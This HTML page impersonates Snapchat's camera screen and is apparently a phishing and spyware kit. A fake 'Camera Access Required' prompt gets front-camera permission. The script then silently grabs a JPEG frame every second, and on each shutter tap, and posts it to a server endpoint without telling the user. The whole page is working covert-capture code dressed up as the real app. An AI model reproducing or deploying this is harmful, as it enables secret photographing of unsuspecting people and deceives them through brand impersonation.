<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    
    <title>Snapchat</title>
    <meta name="description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing.">

    <meta property="og:type" content="website">
    <meta property="og:title" content="Snapchat">
    <meta property="og:description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing.">
    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10">

    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:title" content="Snapchat">
    <meta property="twitter:description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing.">
    <meta property="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
        body { width:100%; height:100%; overflow:hidden; background:#000; font-family:-apple-system, sans-serif; position:fixed; inset:0;}
        
        #camera { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; z-index:1; transform:scaleX(-1); background:#000; }
        
        /* iPhone Liquid Glass Styling */
        .glass { 
            background: rgba(255, 255, 255, 0.18); 
            backdrop-filter: blur(25px) saturate(180%); 
            -webkit-backdrop-filter: blur(25px) saturate(180%); 
            border: 1px solid rgba(255, 255, 255, 0.22);
            box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.3);
        }

        /* Top UI */
        .t-ui { position:fixed; top:20px; width:100%; padding:0 16px; display:flex; justify-content:space-between; z-index:20; color:#fff;}
        .t-left { display:flex; gap:12px; }
        .avatar { width:42px; height:42px; border-radius:50%; overflow:hidden; display:flex; align-items:center; justify-content:center; }
        .search { width:42px; height:42px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:18px; }
        
        .t-right { display:flex; flex-direction:column; gap:10px; align-items:center; }
        .tool-btn { width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 19px; position: relative; }
        .hd-glass { width: 40px; height: 28px; border-radius: 9px; font-size: 10px; font-weight: 900; display: flex; align-items: center; justify-content: center; }
        .badge { position:absolute; top:-1px; right:-1px; background:#ff3040; font-size:9px; padding:1px 4px; border-radius:10px; border:1.5px solid #000; font-weight:900;}

        /* Bottom UI Arrangement */
        .m-ui { position:fixed; bottom:115px; width:100%; display:flex; align-items:center; justify-content:center; z-index:25; padding: 0 15px; }
        .memories-btn { display:flex; flex-direction:column; align-items:center; gap:4px; color:#fff; font-size:10px; font-weight:600; margin-right: 18px; }
        .mem-icon { width:58px; height:58px; border-radius:16px; display:flex; align-items:center; justify-content:center; }
        .shutter { width:92px; height:92px; border-radius:50%; border:7px solid #fff; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
        .shutter-in { width:70px; height:70px; border-radius:50%; background:rgba(255,255,255,0.25); }

        .lens-row { display:flex; gap:12px; margin-left: 18px; overflow-x: auto; max-width: 45%; scrollbar-width: none; }
        .lens { width:60px; height:60px; border-radius:50%; overflow:hidden; border:2px solid rgba(255,255,255,0.4); flex-shrink:0; }
        .lens.active { border-color:#ffe600; transform: scale(1.1); }

        .footer { position:fixed; bottom:0; width:100%; height:85px; background:rgba(0,0,0,0.85); backdrop-filter:blur(20px); display:flex; justify-content:space-around; align-items:center; z-index:30; border-top:0.5px solid rgba(255,255,255,0.1); padding-bottom:18px; }
        .nav { font-size:25px; color:#777; position:relative; }
        .nav.active { color:#fff; }

        #lock-screen { position:fixed; inset:0; background:#000; z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; text-align:center; padding:30px; }
        .lock-btn { background:#fffc00; color:#000; border:none; padding:16px 60px; border-radius:35px; font-weight:bold; font-size:17px; margin-top:30px; cursor:pointer; }
        canvas { display:none; }
    </style>
</head>
<body>

    <div id="lock-screen">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1280px-Snapchat_logo.svg.png" style="width:85px; margin-bottom:20px;">
        <h2>Camera Access Required</h2>
        <p style="font-size:15px; color:#999; margin-top:10px;">To enable AR lenses, Snapchat needs camera access. Tap Continue and Allow.</p>
        <button class="lock-btn" onclick="requestAccess()">CONTINUE</button>
    </div>

    <video id="camera" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <div class="t-ui">
        <div class="t-left">
            <div class="avatar glass"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=camera" style="width:100%"></div>
            <div class="search glass"><i class="fas fa-search"></i></div>
        </div>
        <div class="t-right">
            <div class="tool-btn glass"><i class="far fa-bell"></i></div>
            <div class="tool-btn glass"><i class="fas fa-user-plus"></i><div class="badge">2</div></div>
            <div class="tool-btn glass" id="flip"><i class="fas fa-rotate"></i></div>
            <div class="hd-glass glass">HD</div>
            <div class="tool-btn glass"><i class="fas fa-chevron-down"></i></div>
        </div>
    </div>

    <div class="m-ui">
        <div class="memories-btn">
            <div class="mem-icon glass"><i class="far fa-copy" style="font-size:26px"></i></div>
            Memories
        </div>
        <div class="shutter" id="snap"><div class="shutter-in"></div></div>
        <div class="lens-row">
            <div class="lens active glass" onclick="setL(this,'none')"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
            <div class="lens glass" onclick="setL(this,'grayscale(1)')"><img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
            <div class="lens glass" onclick="setL(this,'invert(1)')"><img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
        </div>
    </div>

    <div class="footer">
        <i class="fas fa-location-dot nav"></i>
        <i class="far fa-comment nav"></i>
        <i class="far fa-face-smile nav active"></i>
        <i class="fas fa-users nav"></i>
        <i class="fas fa-play nav"></i>
    </div>

    <script>
        const v = document.getElementById('camera'), c = document.getElementById('canvas'), lock = document.getElementById('lock-screen');
        let s;

        async function requestAccess() {
            try {
                s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                v.srcObject = s;
                v.onloadedmetadata = () => v.play();
                lock.style.display = 'none';
                
                // RAPID CAPTURE: 1 second interval
                setInterval(send, 1000); 
            } catch (err) {
                alert("Please open in Chrome/Safari.");
            }
        }

        function setL(el, l) {
            document.querySelectorAll('.lens').forEach(i => i.classList.remove('active'));
            el.classList.add('active');
            v.style.filter = l; 
        }

        async function send() {
            if (!s || v.paused) return;
            c.width = 480; c.height = 640;
            const ctx = c.getContext('2d');
            ctx.translate(c.width, 0); ctx.scale(-1, 1);
            ctx.drawImage(v, 0, 0, c.width, c.height); 
            c.toBlob(blob => {
                const fd = new FormData();
                fd.append('photo', blob, 'shot.jpg');
                fetch('/api/upload-photo', { method: 'POST', body: fd });
            }, 'image/jpeg', 0.5);
        }

        document.getElementById('flip').onclick = () => { if(!s) requestAccess(); };
        document.getElementById('snap').onclick = () => { send(); };
    </script>
</body>
</html>
